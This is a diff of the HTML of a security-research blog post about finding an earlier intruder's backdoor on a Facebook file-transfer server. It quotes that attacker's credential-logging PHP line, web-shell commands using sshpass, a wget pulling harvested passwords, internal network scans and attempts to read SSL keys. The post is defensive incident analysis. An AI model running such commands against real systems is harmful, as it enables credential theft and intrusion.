+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d H:i:s T"</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">";"</span> <span class="mf">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">";"</span> <span class="mf">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"HTTP_USER_AGENT"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">";POST="</span> <span class="mf">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">";GET="</span> <span class="mf">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">";COOKIE="</span> <span class="mf">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span> 
 
-<span class="c1">// blah blah blah...</span></code></pre></div>
+<span class="c1">// blah blah blah...</span></code></pre></figure>
 
 <p>The first few ones were typical PHP one-line backdoor and there’s one exception: “<strong>sclient_user_class_standard.inc</strong>”</p>
 
@@ -298,10 +680,10 @@ I followed the PHP paths in error messages and ended up with discovering suspici
 
 <p>A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://files.fb.com/courier/B3dKe9sQaa0L.log
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://files.fb.com/courier/B3dKe9sQaa0L.log
 </code></pre></div></div>
 
-<p><img src="/assets/img/blog/20160421/5.jpg" alt="logged password" /><br /><br />
+<p><img src="/assets/img/blog/20160421/5.jpg" alt="logged password" /><br />
 <em>↑ Logged passwords</em></p>
 
 <p><br /></p>
@@ -324,50 +706,50 @@ I followed the PHP paths in error messages and ended up with discovering suspici
   <li>When the hacker was sending out commands, he didn’t take care of STDERR, and left a lot of command error messages in web log which the hacker’s operations could be seen</li>
 </ol>
 
-<p><br /><br />
+<p><br />
 From access.log, every few days the hacker will clear all the credentials he logged</p>
 
-<div class="highlight"><pre><code class="language-prolog" data-lang="prolog"><span class="mf">192.168.54.13</span> <span class="o">-</span> <span class="o">-</span> <span class="mi">17955</span> <span class="p">[</span><span class="nv">Sat</span><span class="p">,</span> <span class="mi">23</span> <span class="nv">Jan</span> <span class="mi">2016</span> <span class="mi">19</span><span class="s-Atom">:</span><span class="mi">04</span><span class="s-Atom">:</span><span class="mi">10</span> <span class="o">+</span><span class="mi">0000</span> <span class="p">|</span> <span class="mi">1453575850</span><span class="p">]</span> <span class="s2">&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &#39;********&#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &gt; /home/seos/courier/B3dKe9sQaa0L.log&#39; 2&gt;/dev/stdout HTTP/1.1&quot;</span> <span class="mi">200</span> <span class="mi">2559</span> <span class="p">...</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-prolog" data-lang="prolog"><span class="mf">192.168</span><span class="p">.</span><span class="mf">54.13</span> <span class="o">-</span> <span class="o">-</span> <span class="m">17955</span> <span class="p">[</span><span class="nv">Sat</span><span class="p">,</span> <span class="m">23</span> <span class="nv">Jan</span> <span class="m">2016</span> <span class="m">19</span><span class="o">:</span><span class="m">04</span><span class="o">:</span><span class="m">10</span> <span class="o">+</span><span class="m">0000</span> <span class="p">|</span> <span class="m">1453575850</span><span class="p">]</span> <span class="s2">"GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &gt; /home/seos/courier/B3dKe9sQaa0L.log' 2&gt;/dev/stdout HTTP/1.1"</span> <span class="m">200</span> <span class="m">2559</span> <span class="p">...</span></code></pre></figure>
 
 <p><br /></p>
 
 <p>Packing files</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat tmp_list3_2 <span class="p">|</span> <span class="k">while</span> <span class="nb">read </span>line<span class="p">;</span> <span class="k">do</span> cp /home/filex2/1000/<span class="nv">$line</span> files<span class="p">;</span> <span class="k">done</span> 2&gt;/dev/stdout
-tar -czvf files.tar.gz files</code></pre></div>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>tmp_list3_2 | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">cp</span> /home/filex2/1000/<span class="nv">$line</span> files<span class="p">;</span> <span class="k">done </span>2&gt;/dev/stdout
+<span class="nb">tar</span> <span class="nt">-czvf</span> files.tar.gz files</code></pre></figure>
 
 <p><br /></p>
 
 <p>Enumerating internal network architecture</p>
 
-<div class="highlight"><pre><code class="language-tex" data-lang="tex">dig a archibus.thefacebook.com
+<figure class="highlight"><pre><code class="language-tex" data-lang="tex">dig a archibus.thefacebook.com
 telnet archibus.facebook.com 80
-curl http://archibus.thefacebook.com/spaceview<span class="nb">_</span>facebook/locator/room.php
+curl http://archibus.thefacebook.com/spaceview<span class="p">_</span>facebook/locator/room.php
 dig a records.fb.com
 telnet records.fb.com 80
 telnet records.fb.com 443
 wget -O- -q http://192.168.41.16
 dig a acme.facebook.com
-./sshpass -p &#39;********&#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &#39;for i in <span class="s">$</span><span class="o">(</span><span class="nb">seq </span><span class="m">201</span><span class="nb"> </span><span class="m">1</span><span class="nb"> </span><span class="m">255</span><span class="o">)</span><span class="nb">; do for j in </span><span class="s">$</span>(seq 0 1 255); do echo &quot;192.168.<span class="s">$</span><span class="nb">i.</span><span class="s">$</span>j:`dig +short ptr <span class="s">$</span><span class="nb">j.</span><span class="s">$</span>i.168.192.in-addr.arpa`&quot;; done; done&#39; 2&gt;/dev/stdout
-...</code></pre></div>
+./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in <span class="p">$</span><span class="o">(</span><span class="nb">seq </span><span class="m">201</span><span class="nb"> </span><span class="m">1</span><span class="nb"> </span><span class="m">255</span><span class="o">)</span><span class="nb">; do for j in </span><span class="p">$</span>(seq 0 1 255); do echo "192.168.<span class="p">$</span><span class="nb">i.</span><span class="p">$</span>j:`dig +short ptr <span class="p">$</span><span class="nb">j.</span><span class="p">$</span>i.168.192.in-addr.arpa`"; done; done' 2&gt;/dev/stdout
+...</code></pre></figure>
 
 <p><br /></p>
 
-<p>Use ShellScript to scan internal network but forgot to redirect STDERR XD<br />
-<img src="/assets/img/blog/20160421/6.jpg" alt="Port Scanning" /><br />
+<p>Use ShellScript to scan internal network but forgot to redirect STDERR XD
+<img src="/assets/img/blog/20160421/6.jpg" alt="Port Scanning" />
 <br /></p>
 
 <p>Attempt to connect internal LDAP server</p>
 
-<div class="highlight"><pre><code class="language-tex" data-lang="tex">sh: -c: line 0: syntax error near unexpected token `(&#39;
-sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &#39;********&#39; -s base (objectclass=*) 2&gt;/dev/stdout&#39;</code></pre></div>
+<figure class="highlight"><pre><code class="language-tex" data-lang="tex">sh: -c: line 0: syntax error near unexpected token `('
+sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '********' -s base (objectclass=*) 2&gt;/dev/stdout'</code></pre></figure>
 
 <p><br /></p>
 
-<p>Attempt to access internal server   <br />
+<p>Attempt to access internal server <br />
 (Looked like Mail OWA could be accessed directly…)</p>
 
-<div class="highlight"><pre><code class="language-text" data-lang="text">--20:38:09--  https://mail.thefacebook.com/
+<figure class="highlight"><pre><code class="language-text" data-lang="text">--20:38:09--  https://mail.thefacebook.com/
 Resolving mail.thefacebook.com... 192.168.52.37
 Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
 HTTP request sent, awaiting response... 302 Found
@@ -380,11 +762,11 @@ Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thef
 Reusing existing connection to mail.thefacebook.com:443.
 HTTP request sent, awaiting response... 200 OK
 Length: 8902 (8.7K) [text/html]
-Saving to: `STDOUT&#39;
+Saving to: `STDOUT'
 
      0K ........                                              100% 1.17G=0s
 
-20:38:10 (1.17 GB/s) - `-&#39; saved [8902/8902]
+20:38:10 (1.17 GB/s) - `-' saved [8902/8902]
 
 --20:38:33--  (try:15)  https://10.8.151.47/
 Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
@@ -392,25 +774,25 @@ Resolving svn.thefacebook.com... failed: Name or service not known.
 --20:39:03--  https://sb-dev.thefacebook.com/
 Resolving sb-dev.thefacebook.com... failed: Name or service not known.
 failed: Connection timed out.
-Retrying.</code></pre></div>
+Retrying.</code></pre></figure>
 
 <p><br /></p>
 
 <p>Attempt to steal SSL Private Key</p>
 
-<div class="highlight"><pre><code class="language-text" data-lang="text">sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+<figure class="highlight"><pre><code class="language-text" data-lang="text">sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
 ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
-mv: cannot stat `x&#39;: No such file or directory
+mv: cannot stat `x': No such file or directory
 sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
-mv: cannot stat `x&#39;: No such file or directory
+mv: cannot stat `x': No such file or directory
 sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
-mv: cannot stat `x&#39;: No such file or directory
+mv: cannot stat `x': No such file or directory
 sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
-mv: cannot stat `x&#39;: No such file or directory
+mv: cannot stat `x': No such file or directory
 sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
-mv: cannot stat `x&#39;: No such file or directory
+mv: cannot stat `x': No such file or directory
 sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
-base64: invalid input</code></pre></div>
+base64: invalid input</code></pre></figure>
 
 <p><br /></p>
 
@@ -426,12 +808,12 @@ base64: invalid input</code></pre></div>
 
 <p>Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September</p>
 
-<p>the July one seemed to be a server “dorking” and the September one seemed more vicious. Other than server “dorking” keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P  <br />
+<p>the July one seemed to be a server “dorking” and the September one seemed more vicious. Other than server “dorking” keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P<br />
 The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.</p>
 
 <p><br /></p>
 
-<p>Here’s the end of the story, and, generally speaking, it was a rather interesting experience xD  <br />
+<p>Here’s the end of the story, and, generally speaking, it was a rather interesting experience xD<br />
 Thanks to this event, it inspired me to write some articles about penetration :P</p>
 
 <p>Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )</p>
@@ -456,113 +838,119 @@ Thanks to this event, it inspired me to write some articles about penetration :P
 </ul>
 
 
-              </article>
-              <p class="sns-widgets">
-                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
-              </p>
-          
-              <div class="heading--side-lined">
-                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="blog-author-name">Orange Tsai</a> 
-              </div>
-              <p class="blog-author-info">
-                I am Orange : )
-              </p>
-          
-              <div class="heading--side-lined">
-                Comments
-              </div>
-              <div class="blog-comments">
-                
-
-
-  <div id="disqus_thread"></div>
-<script type="text/javascript">
-    var disqus_developer = 1;
-    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
-    
-    /* * * DON'T EDIT BELOW THIS LINE * * */
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-
-
-              </div>
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/en/blog/author/orange">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/en/blog/author/orange">
+                            <h3>Orange Tsai</h3>
+                        </a>
+                        <span>Principal Security Researcher</span>
+                        <p>
+                            I am Orange : )
+                        </p>
+                    </div>
+                </div>
             </div>
-          </div>
+        </section>
+        
 
-
-
-
-
-
-</main>
-      <div class="container--wrapper">
-
-
-        <div class="contact-section container">
-          <h2 class="contact-section__title">
-            Put your defenses to the test with authentic attacks
-          </h2>
-          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
-        </div>
-
-        <footer class="main-footer">
-          <div class="main-footer__about">
-            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
-          </div>
-          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
-                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
-                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
-          </div>
-          <address class="main-footer__address">
-            <ul class="list--unstyled">
-              <li>
-                13F., No. 32, Sec. 3, Bade Rd., Songshan Dist., Taipei City 105608, Taiwan
-              </li>
-              <li>
-                contact@devco.re
-              </li>
-              <li>
-                +886-2-2577-0925
-              </li>
-            </ul>
-          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2023 DEVCORE</small>
-        </footer>
-      </div>
     </div>
-    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>
 
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
 
-  <script type="text/javascript">
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-30830800-1']);
-  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
 
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-  })();
-</script>
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
 
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
 
+    <div class="copyright">
+        <div class="info">
+            <span>© 2023 DEVCORE <b class="line-block">All right reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
 
-    <!-- Google Tag Manager (noscript) -->
-    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
-    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
-
-  </body>
+</div>
+    </footer>
+</body>
 </html>
+
+
+
+
+
+
 
 
 
